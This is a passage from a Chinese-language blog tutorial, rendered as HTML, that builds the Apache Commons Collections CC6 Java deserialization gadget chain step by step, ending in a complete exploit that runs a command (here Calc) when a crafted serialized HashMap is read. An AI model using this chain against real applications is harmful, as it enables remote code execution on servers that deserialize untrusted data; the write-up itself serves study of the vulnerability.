&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1692068227204-ac45031b-8116-4e8f-ba2c-d780c34eb0aa.png" alt="image.png"></p>
+<h2 id="HashMap-hash"><a href="#HashMap-hash" class="headerlink" title="HashMap#hash()"></a>HashMap#hash()</h2><p>这个hash()是default权限的，我们用反射访问，确定链子到这没问题，Exp如下：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestCC6</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        Transformer[] transformers =  <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;Calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        HashMap&lt;Object,Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(<span class="string">&quot;key1&quot;</span>,<span class="string">&quot;value1&quot;</span>);</span><br><span class="line">        <span class="type">LazyMap</span> <span class="variable">lazyMap</span> <span class="operator">=</span> (LazyMap) LazyMap.decorate(hashMap,chainedTransformer);</span><br><span class="line">        <span class="comment">// lazyMap.get(&quot;Jasper&quot;);</span></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, <span class="string">&quot;key2&quot;</span>);</span><br><span class="line">        <span class="comment">// tiedMapEntry.getValue();</span></span><br><span class="line">        <span class="comment">// tiedMapEntry.hashCode();</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.util.HashMap&quot;</span>);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">hashMethod</span> <span class="operator">=</span> clazz.getDeclaredMethod(<span class="string">&quot;hash&quot;</span>, Object.class);</span><br><span class="line">        hashMethod.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        hashMethod.invoke(clazz,tiedMapEntry);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1692068792272-7f642f99-eb3d-4e50-988a-6f1866e93d1b.png" alt="image.png"></p>
+<h2 id="HashMap-readObject"><a href="#HashMap-readObject" class="headerlink" title="HashMap#readObject()"></a>HashMap#readObject()</h2><p>它的反序列化函数会把hashMap这个对象里的key读出来做hash()，即hash(key)<br>这就需要我们在要序列化的对象里，put一个键值对，把key设成tiedMapEntry对象<br>Exp如下：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestCC6</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        Transformer[] transformers =  <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;Calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        HashMap&lt;Object,Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(<span class="string">&quot;key1&quot;</span>,<span class="string">&quot;value1&quot;</span>);</span><br><span class="line">        <span class="type">LazyMap</span> <span class="variable">lazyMap</span> <span class="operator">=</span> (LazyMap) LazyMap.decorate(hashMap,chainedTransformer);</span><br><span class="line">        <span class="comment">// lazyMap.get(&quot;Jasper&quot;);</span></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, <span class="string">&quot;key2&quot;</span>);</span><br><span class="line">        <span class="comment">// tiedMapEntry.getValue();</span></span><br><span class="line">        <span class="comment">// tiedMapEntry.hashCode();</span></span><br><span class="line">        <span class="comment">// Class clazz = Class.forName(&quot;java.util.HashMap&quot;);</span></span><br><span class="line">        <span class="comment">// Method hashMethod = clazz.getDeclaredMethod(&quot;hash&quot;, Object.class);</span></span><br><span class="line">        <span class="comment">// hashMethod.setAccessible(true);</span></span><br><span class="line">        <span class="comment">// hashMethod.invoke(clazz,tiedMapEntry);</span></span><br><span class="line">        HashMap&lt;Object,Object&gt; hashMap1 = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap1.put(tiedMapEntry,<span class="string">&quot;Jasper&quot;</span>);</span><br><span class="line">        serialize(hashMap1);</span><br><span class="line">        unserialize();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object o)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;object.ser&quot;</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">os</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fos);</span><br><span class="line">        os.writeObject(o);</span><br><span class="line">    </span><br><span class="line">        System.out.println(<span class="string">&quot;序列化完成...&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;object.ser&quot;</span>);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fis);</span><br><span class="line">        <span class="comment">//反序列化执行readObject()方法</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span>  ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line">        fis.close();</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;反序列化完成...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1692069253722-701ae1f0-e2cc-45cf-8ac1-ea410d10e997.png" alt="image.png"></p>
+<p>**但是注意：这里实际上在put键值对的时候就触发了链条，弹出了计算器，这显然不对。</p>
+<p><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1692069369601-7d660f9f-bf2b-431e-8ae7-b1a47ef3c9ff.png" alt="image.png"></p>
+<h2 id="最终Exp"><a href="#最终Exp" class="headerlink" title="最终Exp"></a>最终Exp</h2><p>到这里，Exp还存在两个问题：</p>
+<ul>
+<li>put的时候会提前调用了链条（老让自己电脑执行命令，不方便利用）</li>
+<li>put调用链子后，再次反序列化不会进transform()</li>
+</ul>
+<p>首先解决HashMap#put()会触发链条的问题，这是因为它也会调HashMap#hash()</p>
+<img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1692069477132-1a1c636e-7007-4721-a115-7b9227cedb47.png" alt="image.png" style="zoom:150%;" />
+
+<p>这意味着我们的链条会先被执行一次，而我们不想让它在自己电脑弹计算器（不方便)，可以做这个修改：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//原来</span></span><br><span class="line"><span class="type">LazyMap</span> <span class="variable">lazyMap</span> <span class="operator">=</span> (LazyMap) LazyMap.decorate(hashMap,chainedTransformer);</span><br><span class="line"><span class="comment">//改成</span></span><br><span class="line"><span class="type">LazyMap</span> <span class="variable">lazyMap</span> <span class="operator">=</span> (LazyMap) LazyMap.decorate(hashMap,<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>));</span><br></pre></td></tr></table></figure>
+<p>这样一来，即使put调用了链子，也只是返回一个常量，不会弹计算器。<br>但是，我们在改了链条去绕put之后，在反序列化之前肯定要把链子改回来，尝试编写Exp如下：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestCC6</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        Transformer[] transformers =  <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;Calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        HashMap&lt;Object,Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(<span class="string">&quot;key1&quot;</span>,<span class="string">&quot;value1&quot;</span>);</span><br><span class="line">        <span class="comment">//修改链子，防止put消耗链条</span></span><br><span class="line">        <span class="type">LazyMap</span> <span class="variable">lazyMap</span> <span class="operator">=</span> (LazyMap) LazyMap.decorate(hashMap,<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>));</span><br><span class="line"><span class="comment">//        lazyMap.get(&quot;Jasper&quot;);</span></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, <span class="string">&quot;key2&quot;</span>);</span><br><span class="line"><span class="comment">//        tiedMapEntry.getValue();</span></span><br><span class="line"><span class="comment">//        tiedMapEntry.hashCode();</span></span><br><span class="line"><span class="comment">//        Class clazz = Class.forName(&quot;java.util.HashMap&quot;);</span></span><br><span class="line"><span class="comment">//        Method hashMethod = clazz.getDeclaredMethod(&quot;hash&quot;, Object.class);</span></span><br><span class="line"><span class="comment">//        hashMethod.setAccessible(true);</span></span><br><span class="line"><span class="comment">//        hashMethod.invoke(clazz,tiedMapEntry);</span></span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object,Object&gt; hashMap1 = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap1.put(tiedMapEntry,<span class="string">&quot;Jasper&quot;</span>);</span><br><span class="line">        <span class="comment">//把链子改回来</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">factoryField</span> <span class="operator">=</span> lazyMap.getClass().getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">        factoryField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        factoryField.set(lazyMap,chainedTransformer);</span><br><span class="line"></span><br><span class="line">        serialize(hashMap1);</span><br><span class="line">        unserialize();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object o)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;object.ser&quot;</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">os</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fos);</span><br><span class="line">        os.writeObject(o);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;序列化完成...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;object.ser&quot;</span>);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fis);</span><br><span class="line">        <span class="comment">//反序列化执行readObject()方法</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span>  ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line">        fis.close();</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;反序列化完成...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><strong>实际上虽然put会弹计算器，但反序列化还能再弹一个计算器，这里猜测改掉的原因，可能是让exp更加优雅。</strong><br>然后，解决反序列化不进transform()的问题，我们试着调试一下反序列化函数：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">get:157, LazyMap</span><br><span class="line">getValue:74, TiedMapEntry</span><br><span class="line">hashCode:121, TiedMapEntry</span><br><span class="line">hash:338, HashMap</span><br><span class="line">readObject:1397, HashMap</span><br><span class="line">invoke0:-1, NativeMethodAccessorImpl</span><br><span class="line">invoke:62, NativeMethodAccessorImpl</span><br><span class="line">invoke:43, DelegatingMethodAccessorImpl</span><br><span class="line">invoke:497, Method</span><br><span class="line">invokeReadObject:1058, ObjectStreamClass</span><br><span class="line">readSerialData:1900, ObjectInputStream</span><br><span class="line">readOrdinaryObject:1801, ObjectInputStream</span><br><span class="line">readObject0:1351, ObjectInputStream</span><br><span class="line">readObject:371, ObjectInputStream</span><br><span class="line">unserialize:62, TestCC6</span><br><span class="line">main:48, TestCC6</span><br></pre></td></tr></table></figure>
+<p>发现这里key2已经存在了，导致过不了判断，进不了transform()，这是为什么呢？</p>
+<img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1692074328801-197d6508-9c38-4ba6-9b8f-4da04a6c7357.png" alt="image.png" style="zoom:150%;" />
+
+<p>原因在于，执行put的时候调用过了一次这条链，在那时LazyMap就把没加载进来的key2给加进来了：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">get:159, LazyMap</span><br><span class="line">getValue:74, TiedMapEntry</span><br><span class="line">hashCode:121, TiedMapEntry</span><br><span class="line">hash:338, HashMap</span><br><span class="line">put:611, HashMap</span><br><span class="line">main:41, TestCC6</span><br></pre></td></tr></table></figure>
+<img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1692074565632-03a8eed7-de85-4946-bfc2-204be142c233.png" alt="image.png" style="zoom:150%;" />
+
+<p>这也是LazyMap类的功能所在，所谓的<strong>懒加载</strong>，那我们得想办法进到if判断里，来调transform()<br>这里很容易想到，我们把在序列化之前，再把key2给删了就好，最终Exp如下：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.HashSet;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestCC6</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        Transformer[] transformers =  <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;Calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        HashMap&lt;Object,Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(<span class="string">&quot;key1&quot;</span>,<span class="string">&quot;value1&quot;</span>);</span><br><span class="line">        <span class="comment">//修改链子，防止put消耗链条</span></span><br><span class="line">        <span class="type">LazyMap</span> <span class="variable">lazyMap</span> <span class="operator">=</span> (LazyMap) LazyMap.decorate(hashMap,<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>));</span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, <span class="string">&quot;key2&quot;</span>);</span><br><span class="line">        HashMap&lt;Object,Object&gt; hashMap1 = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap1.put(tiedMapEntry,<span class="string">&quot;Jasper&quot;</span>);</span><br><span class="line">        <span class="comment">//把链子改回来</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">factoryField</span> <span class="operator">=</span> lazyMap.getClass().getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">        factoryField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        factoryField.set(lazyMap,chainedTransformer);</span><br><span class="line">        <span class="comment">//绕过IF判断的懒加载，调用Transform</span></span><br><span class="line">        lazyMap.remove(<span class="string">&quot;key2&quot;</span>);</span><br><span class="line">        serialize(hashMap1);</span><br><span class="line">        unserialize();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object o)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;object.ser&quot;</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">os</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fos);</span><br><span class="line">        os.writeObject(o);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;序列化完成...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;object.ser&quot;</span>);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fis);</span><br><span class="line">        <span class="comment">//反序列化执行readObject()方法</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span>  ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line">        fis.close();</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;反序列化完成...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
